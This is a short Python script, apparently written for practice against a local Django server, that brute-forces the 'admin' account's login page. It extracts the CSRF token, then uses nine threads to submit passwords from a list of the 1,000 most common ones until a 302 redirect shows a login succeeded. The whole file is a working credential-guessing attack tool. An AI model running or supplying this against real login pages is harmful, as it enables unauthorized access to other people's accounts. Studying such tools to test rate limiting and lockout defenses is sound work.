from http.client import HTTPResponse
import sys
import requests
import re
import threading
import os

pwfoundflag = 0
def main():
    params = sys.argv
    username = "admin"
    url = "http://127.0.0.1:8000/login/"
    t1 = threading.Thread(target=bruteforce, args=(username,),kwargs={"url":url,"index":1})
    t2 = threading.Thread(target=bruteforce, args=(username,),kwargs={"url":url,"index":2})
    t3 = threading.Thread(target=bruteforce, args=(username,),kwargs={"url":url,"index":3})
    t4 = threading.Thread(target=bruteforce, args=(username,),kwargs={"url":url,"index":4})
    t5 = threading.Thread(target=bruteforce, args=(username,),kwargs={"url":url,"index":5})
    t6 = threading.Thread(target=bruteforce, args=(username,),kwargs={"url":url,"index":6})
    t7 = threading.Thread(target=bruteforce, args=(username,),kwargs={"url":url,"index":7})
    t8 = threading.Thread(target=bruteforce, args=(username,),kwargs={"url":url,"index":8})
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()
    t6.start()
    t7.start()
    t8.start()
    bruteforce(username=username,url=url,index=0)


def searchforcsrf(input):
        x = input.text
        inputtag = re.search(r"<input type=\"hidden\" name=\"csrfmiddlewaretoken\" value=\"[^\"]*\">",x)
        valuelist = re.findall(r"\"[^\"]*\"",inputtag.group())
        mwt = valuelist[2]
        mwt =mwt.strip('\"')
        return mwt


def bruteforce(username,url,index):
    filez = open("1000-most-common-passwords.txt","r")
    passworddict =filez.readlines()
    counter = index
    req = requests.get(url = url)
    mwt=searchforcsrf(req)
    csrftoken = req.cookies.get("csrftoken")
    parameters = {}
    global pwfoundflag
    while (counter < len(passworddict)) and pwfoundflag ==0:
        password = passworddict[counter].strip()
        headers = {'Content-type': 'application/x-www-form-urlencoded'}
        submitform = requests.post(headers=headers,url=url,cookies={"csrftoken":csrftoken},data={"csrfmiddlewaretoken":mwt,"username":username,"password":password},allow_redirects=False)
        counter = counter + 9
        if pwfoundflag ==1:
            break
        print("Trying Password: "+ password)
        if submitform.status_code == 302:
            print("SUCCESSSSSSSSSSSSSSSSSSSSSSS")
            print("Password is    " + password)
            pwfoundflag = 1
            quit()
        if  len(passworddict)<counter:
            print("password not found")
main()
